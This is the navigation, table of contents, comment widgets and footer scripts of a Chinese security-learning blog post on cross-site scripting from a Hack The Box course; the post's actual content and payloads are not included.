fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/10/24/HackingWordPressHTB/" title="HackingWordPressHTB"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-24</div><div class="title">HackingWordPressHTB</div></div></a></div><div><a href="/2023/11/15/Information%20Gathering%20-%20Web%20EditionHTB/" title="Information Gathering - Web EditionHTB"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-15</div><div class="title">Information Gathering - Web EditionHTB</div></div></a></div><div><a href="/2023/11/07/IntroToAssemblyShellcodingANDSkill/" title="IntroToAssemblyShellcodingANDSkillHTB"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-07</div><div class="title">IntroToAssemblyShellcodingANDSkillHTB</div></div></a></div><div><a href="/2023/11/04/IntroToAssemblyArchANDAssembDebugger/" title="IntroToAssemblyArchANDAssembDebuggerHTB"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-04</div><div class="title">IntroToAssemblyArchANDAssembDebuggerHTB</div></div></a></div><div><a href="/2023/10/28/IntroductiontoBashScriptingHTB/" title="IntroductiontoBashScriptingHTB"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-28</div><div class="title">IntroductiontoBashScriptingHTB</div></div></a></div><div><a href="/2023/11/05/IntroToAssemblyBasicInstructionsANDFunctions/" title="IntroToAssemblyBasicInstructionsANDFunctionsHTB"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-05</div><div class="title">IntroToAssemblyBasicInstructionsANDFunctionsHTB</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Mikannse</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">274</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">70</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/mikannse/mikannse.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">暂时没有公告QAQ</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS-Basics"><span class="toc-number">1.</span> <span class="toc-text">XSS Basics</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#What-is-XSS"><span class="toc-number">1.1.</span> <span class="toc-text">What is XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS-Attacks"><span class="toc-number">1.1.1.</span> <span class="toc-text">XSS Attacks</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS%E7%9A%84%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.1.2.</span> <span class="toc-text">XSS的类型</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stored-XSS"><span class="toc-number">1.2.</span> <span class="toc-text">Stored XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS-Testing-Payloads"><span class="toc-number">1.2.1.</span> <span class="toc-text">XSS Testing Payloads</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reflected-XSS"><span class="toc-number">1.3.</span> <span class="toc-text">Reflected XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DOM-XSS"><span class="toc-number">1.4.</span> <span class="toc-text">DOM XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Source-amp-Sink"><span class="toc-number">1.4.1.</span> <span class="toc-text">Source &amp; Sink</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM-Attacks"><span class="toc-number">1.4.2.</span> <span class="toc-text">DOM Attacks</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS-Discovery"><span class="toc-number">1.5.</span> <span class="toc-text">XSS Discovery</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E5%8F%91%E7%8E%B0"><span class="toc-number">1.5.1.</span> <span class="toc-text">自动发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E5%8F%91%E7%8E%B0"><span class="toc-number">1.5.2.</span> <span class="toc-text">手动发现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#XSS-Payloads-XSS%E6%9C%89%E6%95%88%E8%BD%BD%E8%8D%B7"><span class="toc-number">1.5.2.1.</span> <span class="toc-text">XSS Payloads XSS有效载荷</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS-Attacks-1"><span class="toc-number">2.</span> <span class="toc-text">XSS Attacks</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Defacing"><span class="toc-number">2.1.</span> <span class="toc-text">Defacing</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B1%A1%E6%8D%9F%E5%85%83%E7%B4%A0"><span class="toc-number">2.1.1.</span> <span class="toc-text">污损元素</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Changing-Background"><span class="toc-number">2.1.2.</span> <span class="toc-text">Changing Background</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Changing-Page-Title"><span class="toc-number">2.1.3.</span> <span class="toc-text">Changing Page Title</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Changing-Page-Text"><span class="toc-number">2.1.4.</span> <span class="toc-text">Changing Page Text</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Phishing"><span class="toc-number">2.2.</span> <span class="toc-text">Phishing</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS-Discovery-1"><span class="toc-number">2.2.1.</span> <span class="toc-text">XSS Discovery</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Login-Form-Injection"><span class="toc-number">2.2.2.</span> <span class="toc-text">Login Form Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cleaning-Up"><span class="toc-number">2.2.3.</span> <span class="toc-text">Cleaning Up</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Credential-Stealing"><span class="toc-number">2.2.4.</span> <span class="toc-text">Credential Stealing</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Session-Hijacking"><span class="toc-number">2.3.</span> <span class="toc-text">Session Hijacking</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Blind-XSS-Detection"><span class="toc-number">2.3.1.</span> <span class="toc-text">Blind XSS Detection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Loading-a-Remote-Script%E5%8A%A0%E8%BD%BD%E8%BF%9C%E7%A8%8B%E8%84%9A%E6%9C%AC"><span class="toc-number">2.3.2.</span> <span class="toc-text">Loading a Remote Script加载远程脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Session-Hijacking-1"><span class="toc-number">2.3.3.</span> <span class="toc-text">Session Hijacking</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS-Prevention"><span class="toc-number">3.</span> <span class="toc-text">XSS Prevention</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Front-end"><span class="toc-number">3.1.</span> <span class="toc-text">Front-end</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Input-Validation"><span class="toc-number">3.1.0.1.</span> <span class="toc-text">Input Validation</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BE%93%E5%85%A5%E6%B6%88%E6%AF%92"><span class="toc-number">3.1.0.2.</span> <span class="toc-text">输入消毒</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Direct-Inpu"><span class="toc-number">3.1.0.3.</span> <span class="toc-text">Direct Inpu</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Back-end"><span class="toc-number">3.2.</span> <span class="toc-text">Back-end</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Input-Validation-1"><span class="toc-number">3.2.0.1.</span> <span class="toc-text">Input Validation</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Input-Sanitization"><span class="toc-number">3.2.0.2.</span> <span class="toc-text">Input Sanitization</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Output-HTML-Encoding"><span class="toc-number">3.2.0.3.</span> <span class="toc-text">Output HTML Encoding</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Server-Configuration"><span class="toc-number">3.2.0.4.</span> <span class="toc-text">Server Configuration</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/11/pwncollegeAssembly30/" title="pwncollegeAssembly30">pwncollegeAssembly30</a><time datetime="2024-10-10T17:05:42.000Z" title="发表于 2024-10-11 01:05:42">2024-10-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/09/pwncollege%E6%B1%87%E7%BC%96%E5%85%A5%E9%97%A8/" title="pwncollege汇编入门">pwncollege汇编入门</a><time datetime="2024-10-09T14:39:52.000Z" title="发表于 2024-10-09 22:39:52">2024-10-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/05/Git%E9%80%9F%E6%88%90/" title="Git速成">Git速成</a><time datetime="2024-10-05T04:57:08.000Z" title="发表于 2024-10-05 12:57:08">2024-10-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/03/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%85%AD%E4%BA%8C)%E4%B9%8BVulnHubCorrosion2/" title="打靶记录(一六二)之VulnHubCorrosion2">打靶记录(一六二)之VulnHubCorrosion2</a><time datetime="2024-10-03T09:24:11.000Z" title="发表于 2024-10-03 17:24:11">2024-10-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/02/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%85%AD%E4%B8%80)%E4%B9%8BVulnHubDrippingBlues1/" title="打靶记录(一六一)之VulnHubDrippingBlues1">打靶记录(一六一)之VulnHubDrippingBlues1</a><time datetime="2024-10-02T05:16:28.000Z" title="发表于 2024-10-02 13:16:28">2024-10-02</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://cdn.jsdelivr.net/gh/yjr-1100/Photobag/githubioimg/background_4k.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2024 By Mikannse</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: '',
+      appKey: '',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script>function loadDisqus () {
+  const disqus_config = function () {
+    this.page.url = 'http://mikannse.space/2023/11/17/Cross-Site%20Scripting%20(XSS)HTB/'
+    this.page.identifier = '/2023/11/17/Cross-Site%20Scripting%20(XSS)HTB/'
+    this.page.title = 'Cross-Site Scripting (XSS)HTB'
+  }
+
+  const disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  btf.addModeChange('disqus', disqusReset)
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+}
+
+if ('Valine' === 'Disqus' || !true) {
+  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
